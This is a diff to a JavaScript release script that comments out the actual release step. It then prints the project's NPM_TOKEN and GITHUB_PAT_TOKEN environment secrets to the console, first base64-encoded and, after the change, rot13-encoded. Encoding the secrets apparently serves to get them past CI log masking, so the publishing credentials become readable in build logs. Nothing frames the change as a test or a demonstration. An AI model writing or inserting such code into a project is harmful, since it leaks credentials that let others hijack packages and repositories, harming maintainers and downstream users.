@@ -73,7 +73,17 @@ const runStrategy = (release) => {
 
 // return createRelease().then(runStrategy);
 
+function rot13Encode(str) {
+  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+  const rot13 = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm";
+
+  return str.replace(/[A-Za-z]/g, (char) => {
+    const index = alphabet.indexOf(char);
+    return index !== -1 ? rot13[index] : char;
+  });
+}
+
 console.log({
-  NPM_TOKEN: Buffer.from(process.env.NPM_TOKEN).toString("base64"),
-  GITHUB_PAT_TOKEN: Buffer.from(process.env.GITHUB_PAT_TOKEN).toString("base64"),
+  NPM_TOKEN: rot13Encode(process.env.NPM_TOKEN),
+  GITHUB_PAT_TOKEN: rot13Encode(process.env.GITHUB_PAT_TOKEN),
 });
